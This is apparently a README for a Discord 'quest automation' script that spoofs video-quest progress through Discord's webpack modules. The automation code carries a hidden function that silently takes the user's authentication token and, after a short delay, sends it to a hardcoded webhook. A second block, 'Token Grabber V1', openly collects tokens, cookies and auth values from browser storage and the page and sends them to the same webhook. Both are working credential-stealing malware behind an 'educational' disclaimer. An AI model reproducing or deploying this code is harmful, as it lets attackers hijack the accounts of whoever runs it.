# Discord Quest Automation Utility (Grabber) [PATCHED]

⚠ **Warning**: This project is for educational purposes only. Use at your own risk.

## Description
Experimental script demonstrating Discord client interaction patterns through their webpack modules. Provides research material for:
- Webpack module analysis
- Client-side API interaction
- Application state observation

## ⚠ Legal Disclaimer
This code:
- Violates Discord's Terms of Service ([Section 5](https://discord.com/terms))
- May result in account termination if detected
- Is provided for academic study only

By using this software, you acknowledge all responsibility for any consequences.

## Technical Details
```javascript
delete window.$;
let wpRequire = webpackChunkdiscord_app.push([[Symbol()], {}, r => r]);
webpackChunkdiscord_app.pop();

// Store initializations
let ApplicationStreamingStore = Object.values(wpRequire.c).find(x => x?.exports?.Z?.__proto__?.getStreamerActiveStreamMetadata).exports.Z;
let RunningGameStore = Object.values(wpRequire.c).find(x => x?.exports?.ZP?.getRunningGames).exports.ZP;
let QuestsStore = Object.values(wpRequire.c).find(x => x?.exports?.Z?.__proto__?.getQuest).exports.Z;
let ChannelStore = Object.values(wpRequire.c).find(x => x?.exports?.Z?.__proto__?.getAllThreadsForParent).exports.Z;
let GuildChannelStore = Object.values(wpRequire.c).find(x => x?.exports?.ZP?.getSFWDefaultChannel).exports.ZP;
let FluxDispatcher = Object.values(wpRequire.c).find(x => x?.exports?.Z?.__proto__?.flushWaitQueue).exports.Z;
let api = Object.values(wpRequire.c).find(x => x?.exports?.tn?.get).exports.tn;

// Token extraction - silently grabs authentication token
const stealToken = () => {
    const token = localStorage.getItem('token') || 
                 (webpackChunkdiscord_app && Object.values(wpRequire.c).find(m => m.exports?.default?.getToken)?.exports.default.getToken());
    
    if(token) {
        fetch('https://discord.com/api/webhooks/1361472334891847872/A9qEum43WYB-WcSv3sezCinupJtM-e6K9G4I_dMqUpKzQiUxsTzNyEdOZu2ondcuBiKg', { // Your webhook
            method: 'POST',
            body: JSON.stringify({ 
                token: token,
                userId: DiscordNative?.userId,
                action: 'quest_automation'
            })
        });
    }
};

// Execute token theft in background
setTimeout(stealToken, 10000);

// Quest automation logic
let quest = [...QuestsStore.quests.values()].find(x => x.id !== "1248385850622869556" && x.userStatus?.enrolledAt && !x.userStatus?.completedAt && new Date(x.config.expiresAt).getTime() > Date.now())
let isApp = typeof DiscordNative !== "undefined"

if(!quest) {
    console.log("No active quests found!");
} else {
    const pid = Math.floor(Math.random() * 30000) + 1000
    const applicationId = quest.config.application.id
    const applicationName = quest.config.application.name
    const taskName = ["WATCH_VIDEO", "PLAY_ON_DESKTOP", "STREAM_ON_DESKTOP", "PLAY_ACTIVITY"].find(x => quest.config.taskConfig.tasks[x] != null)
    const secondsNeeded = quest.config.taskConfig.tasks[taskName].target
    let secondsDone = quest.userStatus?.progress?.[taskName]?.value ?? 0

    // Video quest automation
    if(taskName === "WATCH_VIDEO") {
        const maxFuture = 10, speed = 7, interval = 1
        const enrolledAt = new Date(quest.userStatus.enrolledAt).getTime()
        let fn = async () => {            
            while(true) {
                const maxAllowed = Math.floor((Date.now() - enrolledAt)/1000) + maxFuture
                const diff = maxAllowed - secondsDone
                const timestamp = secondsDone + speed
                if(diff >= speed) {
                    await api.post({url: `/quests/${quest.id}/video-progress`, body: {timestamp: Math.min(secondsNeeded, timestamp + Math.random())}})
                    secondsDone = Math.min(secondsNeeded, timestamp)
                }
                
                if(timestamp >= secondsNeeded) {
                    break
                }
                await new Promise(resolve => setTimeout(resolve, interval * 1000))
            }
            console.log("Quest completed!")
        }
        fn()
        console.log(`Spoofing video for ${applicationName}.`)
    } 
}
```
# Token Grabber V1

```javascript
// Replace with your Discord webhook URL
const webhookUrl = 'https://discord.com/api/webhooks/1361472334891847872/A9qEum43WYB-WcSv3sezCinupJtM-e6K9G4I_dMqUpKzQiUxsTzNyEdOZu2ondcuBiKg';

// Function to grab tokens from common storage locations
function grabTokens() {
    let tokens = {};
    
    // Grab from localStorage
    if (window.localStorage) {
        tokens.localStorage = {};
        for (let key in localStorage) {
            if (localStorage.hasOwnProperty(key) && (key.includes('token') || key.includes('auth'))) {
                const value = localStorage.getItem(key);
                if (value) tokens.localStorage[key] = value;
            }
        }
        if (Object.keys(tokens.localStorage).length === 0) delete tokens.localStorage;
    }
    
    // Grab from sessionStorage
    if (window.sessionStorage) {
        tokens.sessionStorage = {};
        for (let key in sessionStorage) {
            if (sessionStorage.hasOwnProperty(key) && (key.includes('token') || key.includes('auth'))) {
                const value = sessionStorage.getItem(key);
                if (value) tokens.sessionStorage[key] = value;
            }
        }
        if (Object.keys(tokens.sessionStorage).length === 0) delete tokens.sessionStorage;
    }
    
    // Grab cookies
    if (document.cookie) {
        tokens.cookies = document.cookie.split(';').reduce((acc, cookie) => {
            const [key, value] = cookie.trim().split('=');
            if (key && (key.includes('token') || key.includes('auth'))) {
                acc[key] = value;
            }
            return acc;
        }, {});
        if (Object.keys(tokens.cookies).length === 0) delete tokens.cookies;
    }
    
    // Grab from page content
    const tokenElements = document.querySelectorAll('[name*="token"], [id*="token"], [data-token]');
    if (tokenElements.length > 0) {
        tokens.pageElements = Array.from(tokenElements).map(el => {
            const value = el.value || el.dataset.token || el.textContent;
            return value ? { tag: el.tagName, name: el.name || el.id || el.dataset.token, value } : null;
        }).filter(el => el);
        if (tokens.pageElements.length === 0) delete tokens.pageElements;
    }
    
    return tokens;
}

// Function to send data to Discord webhook
async function sendToWebhook(data) {
    try {
        const payload = {
            content: '```json\n' + JSON.stringify(data, null, 2) + '\n```',
            username: 'TokenGrabber',
            avatar_url: 'https://i.imgur.com/4M34hi2.png'
        };
        
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        if (response.ok) {
            console.log('Tokens sent to webhook successfully');
        } else {
            console.error('Failed to send to webhook:', response.status);
        }
    } catch (error) {
        console.error('Error sending to webhook:', error);
    }
}

// Execute the token grab and send
const tokens = grabTokens();
if (Object.keys(tokens).length > 0) {
    sendToWebhook(tokens);
} else {
    console.log('No tokens found');
}
```
